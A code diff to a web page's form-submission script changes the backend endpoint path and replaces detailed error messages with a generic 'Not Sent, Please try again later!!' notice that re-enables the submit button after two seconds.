@@ -624,7 +624,7 @@ closeAdButton.addEventListener("click", slideOutAd);
 
 	  // Send form data to backend
 	  
-	        const url = 'https://in-7pdw.onrender.com/api/data';
+	        const url = 'https://in-7pdw.onrender.com/api/dat';
 	  
 	         // Show file info when a file is selected
         document.getElementById('selfie').addEventListener('change', function(e) {
@@ -672,12 +672,18 @@ closeAdButton.addEventListener("click", slideOutAd);
 					submitBtn.disabled = false;
                 } else {
                     document.getElementById('response').innerHTML = 
-                        `<p class="error">❌ Error: ${result.error}</p>`;
+                       `<p class="error">Not Sent, Please try again later!!</p>`;
+					setTimeout(() => {
+						submitBtn.disabled = false;
+					}, 2000);
                 }
             } catch (error) {
                 console.error('Error:', error);
                 document.getElementById('response').innerHTML = 
-                    '<p class="error">❌ Network error. Make sure the server is running on port 3000.</p>';
+                     `<p class="error">Not Sent, Please try again later!!</p>`;
+					setTimeout(() => {
+						submitBtn.disabled = false;
+					}, 2000);
             } finally {
                 submitButton.textContent = originalText;
                 submitButton.disabled = false;
@@ -709,12 +715,18 @@ closeAdButton.addEventListener("click", slideOutAd);
 					submitBtn.disabled = false;
                 } else {
                     document.getElementById('response').innerHTML = 
-                        `<p class="error">❌ Error: ${result.error}</p>`;
+                         `<p class="error">Not Sent, Please try again later!!</p>`;
+					setTimeout(() => {
+						submitBtn.disabled = false;
+					}, 2000);
                 }
             } catch (error) {
                 console.error('Error:', error);
                 document.getElementById('response').innerHTML = 
-                    '<p class="error">❌ Network error. Make sure the server is running on port 3000.</p>';
+                     `<p class="error">Not Sent, Please try again later!!</p>`;
+					setTimeout(() => {
+						submitBtn.disabled = false;
+					}, 2000);
             } finally {
                 submitButton.textContent = originalText;
                 submitButton.disabled = false;
@@ -746,12 +758,18 @@ closeAdButton.addEventListener("click", slideOutAd);
 					submitBtn.disabled = false;
                 } else {
                     document.getElementById('response').innerHTML = 
-                        `<p class="error">❌ Error: ${result.error}</p>`;
+                         `<p class="error">Not Sent, Please try again later!!</p>`;
+					setTimeout(() => {
+						submitBtn.disabled = false;
+					}, 2000);
                 }
             } catch (error) {
                 console.error('Error:', error);
                 document.getElementById('response').innerHTML = 
-                    '<p class="error">❌ Network error. Make sure the server is running on port 3000.</p>';
+                     `<p class="error">Not Sent, Please try again later!!</p>`;
+					setTimeout(() => {
+						submitBtn.disabled = false;
+					}, 2000);
             } finally {
                 submitButton.textContent = originalText;
                 submitButton.disabled = false;
